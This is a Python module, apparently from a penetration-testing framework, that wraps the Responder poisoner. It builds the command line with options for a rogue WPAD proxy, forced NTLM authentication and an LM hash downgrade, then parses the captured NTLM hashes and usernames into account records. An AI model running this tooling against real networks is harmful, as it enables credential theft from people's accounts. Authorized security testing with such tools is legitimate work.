"""responder — LLMNR/NBT-NS/mDNS poisoner for credential capture."""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from ofx.tasks.base import OptDef, Task
from ofx.tasks.output_types import UserAccount
from ofx.tasks.registry import TaskRegistry

@TaskRegistry.register("responder")
class ResponderTask(Task):
    name = "responder"
    cmd = "responder"
    description = "LLMNR/NBT-NS/mDNS poisoner for credential capture"
    category = "ad/poison"
    install_cmd = "apt install -y responder"
    output_types = [UserAccount]

    opts = {
        "interface": OptDef(flag="-I", type=str, help="Network interface"),
        "analyze": OptDef(flag="-A", is_flag=True, help="Analyze mode (no poisoning)"),
        "wredir": OptDef(flag="-w", is_flag=True, help="Start WPAD rogue proxy"),
        "force_wpad": OptDef(flag="-F", is_flag=True, help="Force WPAD authentication"),
        "proxy_auth": OptDef(flag="-P", is_flag=True, help="Force NTLM auth for proxy"),
        "lm": OptDef(flag="--lm", is_flag=True, help="Force LM hashing downgrade"),
        "disable_ess": OptDef(
            flag="--disable-ess", is_flag=True, help="Disable ESS downgrade"
        ),
        "verbose": OptDef(flag="-v", is_flag=True, help="Verbose output"),
    }

    input_flag = None
    file_flag = None
    output_flag = None
    extra_flags: list[str] = []

    def _output_suffix(self) -> str:
        return ".txt"

    def build_command(self, target: str, **kwargs: Any) -> tuple[str, Path | None]:
        """Build: ``responder -I eth0 [options]``."""
        parts: list[str] = [self.cmd]

        interface = kwargs.pop("interface", target)
        parts.extend(["-I", self._q(interface)])

        parts.extend(self._build_opt_parts(kwargs))

        return " ".join(parts), None

    _HASH_RE = re.compile(
        r"^\[(?:SMB|HTTP|LDAP|MSSQL|FTP)\]\s+NTLMv[12]-SSP\s+Hash\s*:\s*(.+)",
        re.IGNORECASE,
    )
    _USERNAME_RE = re.compile(
        r"^\[(?:SMB|HTTP|LDAP|MSSQL|FTP)\]\s+NTLMv[12]-SSP\s+Username\s*:\s*(.+)",
        re.IGNORECASE,
    )
    _CLIENT_RE = re.compile(
        r"^\[(?:SMB|HTTP|LDAP|MSSQL|FTP)\]\s+NTLMv[12]-SSP\s+Client\s*:\s*(.+)",
        re.IGNORECASE,
    )

    def parse_output(
        self,
        stdout: str,
        stderr: str,
        output_file: Path | None = None,
    ) -> list[UserAccount]:
        raw = self._raw_output(stdout, output_file)
        if not raw:
            return []

        results: list[UserAccount] = []
        seen: set[str] = set()

        for line in raw.splitlines():
            line = line.strip()
            m = self._HASH_RE.match(line)
            if m:
                hash_line = m.group(1).strip()
                parts = hash_line.split(":")
                if len(parts) >= 3:
                    username = parts[0]
                    domain = parts[2] if len(parts) > 2 else ""
                    key = f"{domain}\\{username}"
                    if key not in seen:
                        seen.add(key)
                        results.append(
                            UserAccount(
                                username=username,
                                domain=domain,
                                hash=hash_line,
                                source="responder",
                                comment="NTLMv2-SSP",
                            )
                        )

        return results
